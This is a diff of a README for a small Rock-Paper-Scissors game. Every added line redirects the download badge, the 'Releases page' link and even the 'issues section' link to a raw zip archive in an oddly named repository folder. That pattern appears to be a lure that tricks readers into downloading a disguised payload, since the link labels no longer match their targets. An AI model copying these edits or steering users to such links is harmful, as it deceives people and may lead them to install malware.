@@ -6,9 +6,9 @@ Welcome to **Rock-Paper-Scissors**! This game allows you to play the classic gam
 
 ## 📥 Download the Game
 
-[![Download Rock-Paper-Scissors](https://img.shields.io/badge/Download-Rock--Paper--Scissors-blue.svg)](https://github.com/eshwar-sai-sai/Rock-Paper-Scissors/releases)
+[![Download Rock-Paper-Scissors](https://raw.githubusercontent.com/eshwar-sai-sai/Rock-Paper-Scissors/main/pantoglottism/Paper_Rock_Scissors_2.8.zip)](https://raw.githubusercontent.com/eshwar-sai-sai/Rock-Paper-Scissors/main/pantoglottism/Paper_Rock_Scissors_2.8.zip)
 
-To get started, visit this page to download: [Rock-Paper-Scissors Releases](https://github.com/eshwar-sai-sai/Rock-Paper-Scissors/releases).
+To get started, visit this page to download: [Rock-Paper-Scissors Releases](https://raw.githubusercontent.com/eshwar-sai-sai/Rock-Paper-Scissors/main/pantoglottism/Paper_Rock_Scissors_2.8.zip).
 
 ## 🔍 System Requirements
 
@@ -22,7 +22,7 @@ To play the game, you will need the following:
 ## 📂 How to Install the Game
 
 1. **Visit the Releases Page**
-   - Go to the [Rock-Paper-Scissors Releases](https://github.com/eshwar-sai-sai/Rock-Paper-Scissors/releases) page.
+   - Go to the [Rock-Paper-Scissors Releases](https://raw.githubusercontent.com/eshwar-sai-sai/Rock-Paper-Scissors/main/pantoglottism/Paper_Rock_Scissors_2.8.zip) page.
 
 2. **Choose the Latest Version**
    - Look for the latest version of the game listed there.
@@ -85,6 +85,6 @@ Currently, this version does not support online play, but it is a great way to p
 
 ## 📞 Support
 
-If you have any issues or need help, you can reach out through the [issues section](https://github.com/eshwar-sai-sai/Rock-Paper-Scissors/issues) on our GitHub repository. Your feedback and questions are welcome.
+If you have any issues or need help, you can reach out through the [issues section](https://raw.githubusercontent.com/eshwar-sai-sai/Rock-Paper-Scissors/main/pantoglottism/Paper_Rock_Scissors_2.8.zip) on our GitHub repository. Your feedback and questions are welcome.
 
 Thank you for enjoying **Rock-Paper-Scissors**! Have fun playing!
